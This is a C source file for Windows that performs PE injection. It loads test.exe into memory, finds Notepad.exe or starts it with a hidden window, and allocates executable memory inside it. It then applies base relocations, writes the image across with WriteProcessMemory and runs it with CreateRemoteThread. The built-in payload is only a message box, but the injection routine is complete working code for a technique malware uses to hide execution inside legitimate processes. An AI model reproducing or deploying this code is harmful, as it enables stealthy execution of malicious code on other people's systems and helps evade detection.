#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint(LPVOID lpParameter) {
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", MB_OK);
    return 0;
}

// Function to get the PID of a process by its name
DWORD get_pid_by_name(const char *proc_name) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    DWORD pid = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed, error: %ld\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError());
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, proc_name) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return pid;
}

// Function to launch a process in a hidden state
void LaunchHiddenProcess(const char *processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, (LPSTR)processName, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcess failed, error: %lu\n", GetLastError());
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

PVOID LoadTestExeIntoMemory(const char *exePath) {
    // Load the executable into memory without resolving its dependencies or executing its entry point
    HMODULE hModule = LoadLibraryEx(exePath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hModule == NULL) {
        fprintf(stderr, "LoadLibraryEx failed, error: %lu\n", GetLastError());
        return NULL;
    }

    // The base address of the loaded module (test.exe) in the current process's memory
    return (PVOID)hModule;
}

int main() {
    LPCSTR filename = ".\\test.exe";

    //PVOID imageBase = GetModuleHandle(NULL);
    PVOID imageBase = LoadTestExeIntoMemory(filename);
    //PVOID imageBase = (PVOID)0x00007FF7ED3D0000;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
    //PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)0x00007FF7ED3D0080;

    /*
    printf("SizeOfCode: %p\n", ntHeader->OptionalHeader.SizeOfCode);
    printf("Entry Point: %p\n", ntHeader->OptionalHeader.AddressOfEntryPoint);
    printf("BaseOfCode: %p\n", ntHeader->OptionalHeader.BaseOfCode);
    printf("ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
    printf("DLLCharacteristics: %p\n", ntHeader->OptionalHeader.DllCharacteristics);
    printf("SizeOfImage: %p\n", ntHeader->OptionalHeader.SizeOfImage);

    // Get the data directory
    PIMAGE_DATA_DIRECTORY dataDirectory = ntHeader->OptionalHeader.DataDirectory;

    printf("Data Directories:\n");

    for (int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; ++i) {
        // Each entry in the DataDirectory array
        PIMAGE_DATA_DIRECTORY entry = &dataDirectory[i];

        printf("Directory %d:\t", i);
        printf("  Virtual Address: 0x%08X\t", entry->VirtualAddress);
        printf("  Size: 0x%08X\n", entry->Size);
    }
    */
    //FreeLibrary((HMODULE)imageBase);

    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    if(!memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage)) {
        FreeLibrary((HMODULE)imageBase);
    }
    DWORD pid = get_pid_by_name("Notepad.exe");

    if (pid == 0) {
        LaunchHiddenProcess("Notepad.exe");
        Sleep(5000);
        pid = get_pid_by_name("Notepad.exe");
    }
    if (pid == 0)
        return 0;

    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    printf("Start Relo!\n");
    int i = 1;
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    while (relocationTable->SizeOfBlock > 0) {
        DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
        printf("Relo: %d\n", i);
        i++;
        for (DWORD i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }
    printf("End Relo!\n");
    if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
        FreeLibrary((HMODULE)imageBase);
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    DWORD_PTR injectionEntryRVA = 0x5200;
    DWORD_PTR entryAddress = ntHeader->OptionalHeader.AddressOfEntryPoint;
    DWORD_PTR finalAddress = (DWORD_PTR)imageBase + entryAddress;

    printf("Entry Address: %p\n", finalAddress);

    DWORD_PTR injectionEntryPointAddress = finalAddress + deltaImageBase;
    HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
    if (remoteThread == NULL) {
        FreeLibrary((HMODULE)imageBase);
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(remoteThread, INFINITE);
    Sleep(5000);

    CloseHandle(remoteThread);
    FreeLibrary((HMODULE)imageBase);
    VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
    CloseHandle(targetProcess);
    VirtualFree(localImage, 0, MEM_RELEASE);

    return 0;
}
